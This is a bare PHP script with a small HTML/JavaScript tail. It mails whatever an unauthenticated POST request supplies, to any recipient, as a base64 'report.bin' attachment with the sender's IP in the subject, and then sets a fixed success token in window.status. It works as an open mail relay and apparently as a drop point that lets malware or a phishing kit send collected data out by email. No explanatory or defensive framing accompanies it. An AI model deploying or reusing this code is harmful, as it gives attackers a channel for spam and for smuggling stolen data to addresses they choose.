<?
$ip=getenv("REMOTE_ADDR");
$email=$_POST['a'];
$subject=$_POST['b']."(".$ip.")";
$msg=$_POST['c'];
$tmp = $msg;
$msg=eregi_replace(" ","+",$tmp);
$headers = "Content-Type: application/octet-stream; name=\"report.bin\"\n";
$headers .= "Content-Transfer-Encoding: base64\n";
$headers .= "Content-Disposition: attachment; filename=\"report.bin\"\n";
mail($email, $subject, $msg, $headers);
?>

<!-- REQUIRED -->
<script language="JavaScript">
window.status = "_ret_ok_1";
</script></body></html>